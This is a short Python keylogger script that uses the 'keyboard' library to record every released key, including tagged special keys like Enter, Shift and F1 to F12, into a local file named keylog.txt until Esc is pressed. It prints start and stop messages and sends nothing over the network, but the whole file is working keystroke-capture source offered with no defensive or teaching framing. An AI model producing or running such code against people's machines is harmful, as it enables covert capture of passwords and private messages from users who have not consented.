import keyboard  # Install using: pip install keyboard

log_file = "keylog.txt"

def write_to_log_file(key):
    with open(log_file, "a") as f:
        f.write(key + "\n")

def on_key_event(event):
    key = event.name
    if len(key) == 1:  # Regular key
        write_to_log_file(key)
    elif key == "space":
        write_to_log_file(" ")
    elif key == "enter":
        write_to_log_file("[ENTER]")
    elif key == "backspace":
        write_to_log_file("[BACKSPACE]")
    elif key == "tab":
        write_to_log_file("[TAB]")
    elif key == "caps lock":
        write_to_log_file("[CAPSLOCK]")
    elif key == "shift" or key == "right shift" or key == "left shift":
        write_to_log_file("[SHIFT]")
    elif key == "ctrl" or key == "right ctrl" or key == "left ctrl":
        write_to_log_file("[CTRL]")
    elif key == "alt" or key == "right alt" or key == "left alt":
        write_to_log_file("[ALT]")
    elif key == "esc":
        write_to_log_file("[ESC]")
    elif key == "up":
        write_to_log_file("[UP]")
    elif key == "down":
        write_to_log_file("[DOWN]")
    elif key == "left":
        write_to_log_file("[LEFT]")
    elif key == "right":
        write_to_log_file("[RIGHT]")
    elif key == "delete":
        write_to_log_file("[DELETE]")
    elif key == "f1":
        write_to_log_file("[F1]")
    elif key == "f2":
        write_to_log_file("[F2]")
    elif key == "f3":
        write_to_log_file("[F3]")
    elif key == "f4":
        write_to_log_file("[F4]")
    elif key == "f5":
        write_to_log_file("[F5]")
    elif key == "f6":
        write_to_log_file("[F6]")
    elif key == "f7":
        write_to_log_file("[F7]")
    elif key == "f8":
        write_to_log_file("[F8]")
    elif key == "f9":
        write_to_log_file("[F9]")
    elif key == "f10":
        write_to_log_file("[F10]")
    elif key == "f11":
        write_to_log_file("[F11]")
    elif key == "f12":
        write_to_log_file("[F12]")
    else:
        write_to_log_file("[" + key + "]")

# Set up the listener
keyboard.on_release(on_key_event)

# Inform the user and start the keylogger
print("Keylogger started. Press 'Esc' to stop.")
keyboard.wait("esc")  # Wait for the 'Esc' key to stop the keylogger

# Stop listening for keys
keyboard.unhook_all()
print("Keylogger stopped. Logs saved in", log_file)
